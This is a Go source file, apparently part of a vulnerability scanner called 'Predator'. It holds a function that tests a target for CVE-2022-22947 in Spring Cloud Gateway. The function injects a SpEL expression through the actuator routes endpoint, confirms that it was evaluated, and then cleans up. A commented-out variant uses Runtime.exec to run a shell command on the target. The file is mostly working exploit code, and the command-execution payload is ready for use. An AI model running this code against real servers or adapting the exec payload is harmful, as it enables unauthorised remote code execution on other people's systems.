package springboot

import (
	"Predator/pkg/utils"
	"strings"
)

func CVE_2022_22947(u string) bool {
	header := make(map[string]string)
	header["Content-Type"] = "application/json"
	data := `{"id":"vtest","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"\u0023\u007B999\u002A999\u007D"}}],"uri":"http://example.com","order":0}`
	//cmdData = `{"id":"vtest","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}}],"uri":"http://example.com","order":0}`
	if req, err := utils.HttpRequset(u+"/actuator/gateway/routes/vtest", "POST", data, false, header); err == nil {
		if req.StatusCode == 201 {
			if req2, err := utils.HttpRequset(u+"/actuator/gateway/refresh", "POST", "", false, nil); err == nil {
				if req2.StatusCode == 200 {
					if req3, err := utils.HttpRequset(u+"/actuator/gateway/routes/vtest", "GET", "", false, nil); err == nil {
						if strings.Contains(req3.Body, "998001") {
							_, _ = utils.HttpRequset(u+"/actuator/gateway/routes/vtest", "DELETE", "", false, nil)
							_, _ = utils.HttpRequset(u+"/actuator/gateway/refresh", "POST", "", false, nil)
							return true
						}
					}
				}
			}
		}
	}
	return false
}
